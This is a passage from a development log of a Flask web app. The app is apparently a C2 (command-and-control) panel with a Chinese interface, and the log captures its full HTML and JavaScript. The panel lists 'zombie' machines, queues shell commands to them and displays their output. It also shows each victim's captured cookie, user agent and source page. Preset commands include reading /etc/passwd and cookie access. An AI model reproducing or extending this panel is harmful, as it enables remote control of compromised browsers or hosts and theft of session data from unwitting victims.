\'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:06:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:33] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:06:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:33] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:06:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:33] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:06:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:06:33 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:06:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:06:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:33] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:06:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:33] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:06:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:33] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:06:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:06:36 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:06:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:06:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:36] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:06:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:37] "[33mGET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1[0m" 404 -
2025-06-26 22:06:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:39] "[33mGET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1[0m" 404 -
2025-06-26 22:06:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:43] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:06:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:06:43] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-26 22:06:53 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:06:53 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 22:06:53 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:06:53 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 22:06:53 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:06:53 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 22:06:53 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:06:53 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 22:06:53 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 22:07:23 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 22:07:23 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 22:07:23 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 17733)
2025-06-26 22:07:23 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 22:07:23 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:07:23 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-26 22:07:23 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-26 22:07:23 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-26 22:08:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:08:42 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:08:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0405s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 